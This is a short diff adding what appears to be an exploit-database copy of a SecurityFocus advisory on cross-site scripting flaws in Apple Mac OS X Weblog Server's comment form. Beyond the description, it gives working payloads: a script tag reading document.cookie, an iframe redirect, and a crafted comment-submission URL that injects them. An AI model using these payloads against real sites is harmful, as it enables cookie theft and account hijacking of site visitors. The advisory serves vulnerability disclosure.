@@ -1,0 +1,14 @@
+source: http://www.securityfocus.com/bid/14569/info
+
+Apple Mac OS X Weblog Server is prone to cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.
+
+This issue was originally described in BID 14567 Apple Mac OS X Multiple Vulnerabilities. It is now being assigned its own BID. 
+
+input malicious script into author and comment sections in
+the comment option on the weblog.
+eg:<SCRIPT>alert(document.cookie);</SCRIPT> [cookie theft]
+eg:<iframe src="http://somesite.com"></iframe> [redirect]
+
+http://www.example.com:16080/weblog/[bloguser]/?permalink=[blogentry]&comment=y&page=comments&category=%2F&author=[script]&authorEmail=&authorURL=&commentText=[script]&submit=Submit+Comment 
